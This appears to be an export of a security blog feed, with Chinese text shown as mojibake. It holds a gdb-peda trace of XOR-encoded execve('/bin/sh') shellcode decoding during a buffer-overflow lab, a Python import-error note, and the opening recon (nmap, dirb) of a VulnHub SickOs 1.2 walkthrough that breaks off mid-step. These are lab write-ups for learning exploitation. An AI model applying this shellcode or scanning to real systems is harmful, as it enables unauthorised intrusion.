<br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4b in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  movabs rax,0x493d732f6e69622f<br>   0x00007fffffffde61:  mov    ebp,0x95183677<br>   0x00007fffffffde66:  clc    <br>   0x00007fffffffde67:  (bad)  <br>   0x00007fffffffde68:  jb     0x7fffffffdee6<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4b --&gt; 0xfff82d4827583148 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde33:      sub    rcx,0xfffffffffffffffd<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>=&gt; 0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4b in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde61:  cdq    <br>   0x00007fffffffde62:  push   rax<br>   0x00007fffffffde63:  push   rsp<br>   0x00007fffffffde64:  pop    rdi<br>   0x00007fffffffde65:  push   rdx<br>   0x00007fffffffde66:  pop    rsi<br>   0x00007fffffffde67:  (bad)  <br>   0x00007fffffffde68:  jb     0x7fffffffdee6<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde48 --&gt; 0x4827583148a6c747 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde48 --&gt; 0x4827583148a6c747 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x0 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde57 --&gt; 0x732f6e69622fb848 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>=&gt; 0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>   0x7fffffffde64:      pop    rdi<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde57 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>=&gt; 0x00007fffffffde57:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde61:  cdq    <br>   0x00007fffffffde62:  push   rax<br>   0x00007fffffffde63:  push   rsp<br>   0x00007fffffffde64:  pop    rdi<br>   0x00007fffffffde65:  push   rdx<br>   0x00007fffffffde66:  pop    rsi<br>   0x00007fffffffde67:  push   0x3b<br>   0x00007fffffffde69:  pop    rax<br>   0x00007fffffffde6a:  syscall <br>   0x00007fffffffde6c:  add    BYTE PTR [rax],al<br>   0x00007fffffffde6e:  add    BYTE PTR [rax-0x6f6f6f70],dl<br>End of assembler dump.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Pwn</tag>
      
      <tag>Buffer Overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythonå¸¸è§æŠ¥é”™</title>
    <link href="/2022/07/04/Code/Python/python%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/"/>
    <url>/2022/07/04/Code/Python/python%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Pythonå¸¸è§æŠ¥é”™"><a href="#Pythonå¸¸è§æŠ¥é”™" class="headerlink" title="Pythonå¸¸è§æŠ¥é”™"></a>Pythonå¸¸è§æŠ¥é”™</h1><h2 id="1ã€import"><a href="#1ã€import" class="headerlink" title="1ã€import"></a>1ã€import</h2><blockquote><p><a href="https://blog.csdn.net/qq_19623861/article/details/118196646">https://blog.csdn.net/qq_19623861/article/details/118196646</a></p></blockquote><p>1ã€è„šæœ¬åç§°ä¸å¼•ç”¨åŒ…é‡åï¼ˆnmapï¼‰ï¼Œä¿®æ”¹è„šæœ¬æ–‡ä»¶åå³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 nmap.py</span>  <br>Traceback (most recent call last):<br>  File &quot;/home/kali/PT_Python/nmap.py&quot;, line 1, in &lt;module&gt;<br>    import nmap<br>  File &quot;/home/kali/PT_Python/nmap.py&quot;, line 6, in &lt;module&gt;<br>    nm = nmap.PortScanner()<br>AttributeError: partially initialized module &#x27;nmap&#x27; has no attribute &#x27;PortScanner&#x27; (most likely due to a circular import)<br></code></pre></td></tr></table></figure><p>2ã€root æƒé™å®‰è£…åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> é—®é¢˜: æ˜æ˜å·²ç»å®‰è£…äº†nmap, import nmapå´æ˜¾ç¤ºæ²¡æœ‰</span><br><span class="hljs-meta">#</span><span class="bash"> åŸå› : å®‰è£…æ—¶æ²¡æœ‰rootæƒé™, pipå°†åŒ…å®‰åœ¨äº†å½“å‰ç”¨æˆ·ç›®å½•ä¸‹, è€ŒPythonçš„ç¯å¢ƒå˜é‡ä¸­æ²¡æœ‰è¯¥è·¯å¾„, ä»è€Œå¯¼è‡´å®‰è£…äº†å´æ˜¾ç¤ºæ²¡æœ‰</span><br><span class="hljs-meta">$</span><span class="bash"> sudo pip3 install python-nmap</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
      <tag>Version</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SickOsï¼š1.2</title>
    <link href="/2022/07/04/Penetration/Vulnhub/Part-1/0x0D%20SickOs-1.2/"/>
    <url>/2022/07/04/Penetration/Vulnhub/Part-1/0x0D%20SickOs-1.2/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0D-SickOs-1-2-vulnhub"><a href="#0x0D-SickOs-1-2-vulnhub" class="headerlink" title="0x0D SickOs: 1.2~vulnhub"></a>0x0D SickOs: 1.2~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/sickos-12,144/">SickOs: 1.2 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.154</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.154</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.154</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-04 04:16 EDT<br>Nmap scan report for 192.168.135.154 (192.168.135.154)<br>Host is up (0.00097s latency).<br>Not shown: 65533 filtered ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)<br>|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)<br>|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)<br>80/tcp open  http    lighttpd 1.4.28<br>|_http-server-header: lighttpd/1.4.28<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>MAC Address: 00:0C:29:7C:BD:F7 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.97 ms 192.168.135.154 (192.168.135.154)<br><br>Nmap done: 1 IP address (1 host up) scanned in 113.75 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>lighttpd 1.4.28</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>80ç«¯å£</strong></p><p>è®¿é—®å‘ç°åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œå…¶ä»–ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œè¿›è¡Œç›®å½•çˆ†ç ´ï¼Œå¾—åˆ° test ç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.154</span><br><br>-----------------<br>URL_BASE: http://192.168.135.154/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br><br>---- Scanning URL: http://192.168.135.154/ ----<br>+ http://192.168.135.154/index.php (CODE:200|SIZE:163)<br>==&gt; DIRECTORY: http://192.168.135.154/test/                                                                 <br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.154/test/</code> ï¼Œå‘ç°æ˜¯ä¸ªç©ºç›®å½•ã€‚</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>æŸ¥æ‰¾ lighttpd æ¼æ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit lighttpd</span><br></code></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰å¯ç”¨çš„ï¼Œçœ‹æ¥è¿˜æ˜¯è¦æŠŠåˆ‡å…¥ç‚¹æ”¾åœ¨æ‰«å‡ºæ¥çš„ç›®å½•ä¸Š ã€‚</p><p>å°è¯•ä½¿ç”¨ POST æ–¹å¼ä¸Šä¼ 